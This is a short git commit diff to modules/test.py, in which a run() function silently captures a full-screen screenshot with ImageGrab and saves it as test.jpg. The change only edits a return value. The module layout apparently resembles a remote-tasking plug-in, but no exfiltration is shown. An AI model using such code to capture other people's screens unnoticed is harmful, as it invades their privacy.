ae79ddf10c55c02bbd4a4b4186f1f6ea0ffd0537
experiment2016 <sarpiericam@libero.it>
2016-05-29 20:48:37 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -5,8 +5,9 @@ def run(**args):
   try:
       print("[*} OK")
       sche = ImageGrab.grab().save("test.jpg", "JPEG")
+      ex = "[!]"
       return str(sche)
-      return str("[!]")
+      return str(ex)
   except Exception, e:
     return str(e)
   
